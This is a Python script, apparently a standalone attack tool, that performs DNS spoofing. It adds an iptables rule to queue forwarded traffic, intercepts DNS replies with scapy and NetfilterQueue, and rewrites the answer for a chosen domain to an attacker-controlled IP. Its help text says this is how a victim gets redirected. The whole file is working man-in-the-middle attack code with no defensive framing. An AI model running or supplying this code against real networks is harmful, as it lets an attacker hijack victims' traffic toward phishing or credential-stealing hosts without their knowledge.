import os, sys, argparse
from datetime import datetime
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue


class DNSSpoof:
	def __init__(self, hostDict, queueNum):
		self.hostDict = hostDict
		self.queueNum = queueNum
		self.queue = NetfilterQueue()

	def __call__(self):

		print("\n" + "-"*45)
		print("DNS Spoofing attack started")
		print("Time started: " + str(datetime.now()))
		print("-"*45 + "\n")

		os.system(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}")
		print("[+] Added FORWARD rule to iptables\n")
		self.queue.bind(self.queueNum, self.callBack)
		
		try:
			self.queue.run()
		except KeyboardInterrupt:
			os.system(f"sudo iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}")
			print("\n[!] iptable rule flushed")

	def callBack(self, packet):
		scapyPacket = IP(packet.get_payload())
		if scapyPacket.haslayer(DNSRR):
			try:
				#print(f'[ORIGINAL] { scapyPacket[DNSRR].summary()}')
				print("[ORIGINAL]: ", scapyPacket.summary())
				queryName = scapyPacket[DNSQR].qname
				if queryName in self.hostDict:
					scapyPacket[DNS].an = DNSRR(
						rrname=queryName, rdata=self.hostDict[queryName])
					scapyPacket[DNS].ancount = 1
					del scapyPacket[IP].len
					del scapyPacket[IP].chksum
					del scapyPacket[UDP].len
					del scapyPacket[UDP].chksum
					#print(f'[MODIFIED] {scapyPacket[DNSRR].summary()}')
					print("[MODIFIED]: " + scapyPacket.summary() + "\n")
				else:
					#print(f'[UNABLE TO MODIFY] { scapyPacket[DNSRR].rdata }')
					print("[UNABLE TO MODIFY]: " + scapyPacket.summary() + "\n")
			except IndexError as error:
				pass
			packet.set_payload(bytes(scapyPacket))
		return packet.accept()


if __name__ == '__main__':
	
	parser = argparse.ArgumentParser()
	parser.add_argument("-d", "--domain", help="Domain you want to redirect (poison).")
	parser.add_argument("-t", "--target", help="Target IP where the victim will be redirected.")
	
	args = parser.parse_args()

	domain = args.domain
	target_ip = args.target
	
	try:
		hostDict = {
			f"{domain}" : f"{target_ip}"
		}
		queueNum = 1
		
		spoof = DNSSpoof(hostDict, queueNum)
		spoof()
	except OSError as error:
		sys.exit()
